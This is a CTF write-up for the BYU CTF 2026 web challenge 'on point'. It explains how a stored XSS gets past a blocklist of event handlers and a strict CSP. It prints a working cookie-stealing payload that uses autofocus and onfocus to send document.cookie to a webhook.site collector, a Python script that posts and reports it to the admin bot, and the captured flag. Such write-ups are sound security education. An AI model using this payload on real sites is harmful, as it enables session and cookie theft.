@@ -1,0 +1,93 @@
+---
+title: 'BYU CTF 2026 - on point'
+description: 'Beating an event-handler blocklist and a strict CSP with an onfocus payload and a top-level navigation leak'
+date: 2026-05-30
+tags: ['writeup', 'web', 'xss', 'csp-bypass', 'filter-bypass', 'byuctf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+
+> The last XSS challenge was too easy. And I hate you. So I tried to think of every possible JS function that could possibly be used to XSS my website. I will give you source code though because I'm not a monster.
+>
+> You can report suspicious posts to the admin at https://admin.chals.cyberjousting.com
+>
+> https://onpoint.chals.cyberjousting.com
+
+We get the full source (`app.py`) plus the admin bot (`bot.js`). The flag is stored as a cookie in the admin's headless browser, and the bot visits any post we report, so this is a "steal the admin cookie via XSS" challenge.
+
+## Initial Analysis
+
+The bot sets the flag as a cookie and navigates to our reported URL:
+
+```javascript
+await page.setCookie({ name: "flag", value: "REDACTED", domain: "something", path: "/" });
+await page.goto(url, { waitUntil: "networkidle0", timeout: 10000 });
+```
+
+The app is a social network whose post content is concatenated **raw** into the page (textbook stored-XSS sink). Two defenses stand in the way.
+
+A keyword blocklist applied to post and comment content:
+
+```python
+_BLOCKED = ["script", "fetch", "xmlhttprequest",
+    "onload", "onerror", "ontoggle", "onmouseover", "onmouseenter",
+    "onmouseleave", "onmouseout", "onmousedown", "onmouseup", "ondblclick",
+    "onclick", "onscroll", "onwheel", "onresize", "onkeydown", "onkeyup",
+    "onkeypress", "onsubmit", "onchange", "oninput", "onblur",
+    "oncontextmenu", "onpointerover", "onpointerdown", "onpointerup",
+    "onpageshow", "onpagehide", "onhashchange", "onanimation", "ontransition"]
+# the single quote (') in content is also rejected
+```
+
+And a strict CSP on every response:
+
+```
+Content-Security-Policy: script-src 'unsafe-inline'; connect-src 'none'; img-src 'none'; object-src 'none'
+```
+
+Note also `SESSION_COOKIE_HTTPONLY = False`, so cookies are readable from JS.
+
+## The Vulnerability
+
+The blocklist is long but not exhaustive. The two gaps that matter:
+
+- `onfocus` is **not** blocked. Pair it with `autofocus` and the handler fires automatically on load, no user interaction.
+- single quotes are banned, but **backticks** (template literals) are allowed.
+
+The CSP looks scary but only kills outbound data sinks: `connect-src 'none'` blocks `fetch`/XHR/`sendBeacon`, and `img-src 'none'` blocks image beacons. Crucially there is **no `default-src` and no `navigate-to`**, so **top-level navigation is still allowed**, and `script-src 'unsafe-inline'` even permits inline handlers to run. So we leak the cookie by navigating the bot to our collector with the cookie in the query string.
+
+## Exploitation
+
+The stored payload (no `script`, no banned handler, no single quote):
+
+```html
+<input autofocus onfocus=location=`https://webhook.site/<TOKEN>/?c=`+encodeURIComponent(document.cookie)>
+```
+
+Driver: create the post, grab its id, and report it to the bot.
+
+```python
+import requests
+s = requests.Session()
+s.get("https://onpoint.chals.cyberjousting.com/")   # establish a session
+
+payload = "<input autofocus onfocus=location=`https://webhook.site/<TOKEN>/?c=`+encodeURIComponent(document.cookie)>"
+s.post("https://onpoint.chals.cyberjousting.com/add", data={"content": payload})
+
+# parse the new post id from the home page, then:
+pid = "..."  # from /getpost?id=<pid>
+requests.post("https://admin.chals.cyberjousting.com/report",
+              data={"url": f"https://onpoint.chals.cyberjousting.com/getpost?id={pid}"})
+```
+
+When the bot opens the post, `autofocus` triggers `onfocus`, and the browser navigates to our webhook carrying `?c=flag=byuctf{...}`.
+
+## Flag
+
+```
+byuctf{I_w4s_sur3_th1s_0ne_w4a_b3tt3r...}
+```
+
+> The trailing `...` is literally part of the captured cookie value, and `w4a` is the author's own typo. Submit it verbatim.
